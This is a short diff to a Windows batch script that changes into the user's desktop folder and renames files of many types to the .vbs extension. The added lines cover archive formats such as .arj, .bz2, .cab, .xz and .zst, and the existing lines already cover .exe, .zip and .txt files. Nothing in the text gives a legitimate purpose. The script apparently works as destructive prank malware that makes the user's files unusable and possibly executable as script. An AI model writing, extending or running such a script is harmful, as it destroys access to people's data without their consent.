@@ -1,4 +1,15 @@
 cd C:\Users\%username%\desktop
+ren *.arj *.vbs
+ren *.bz2 *.vbs
+ren *.cab *.vbs
+ren *.lz *.vbs
+ren *.lzh *.vbs
+ren *.uue *.vbs
+ren *.xz *.vbs
+ren *.z *.vbs
+ren *.zipx *.vbs
+ren *.zst *.vbs
+ren *.001 *.vbs
 ren *.exe *.vbs
 ren *.zip *.vbs
 ren *.txt *.vbs
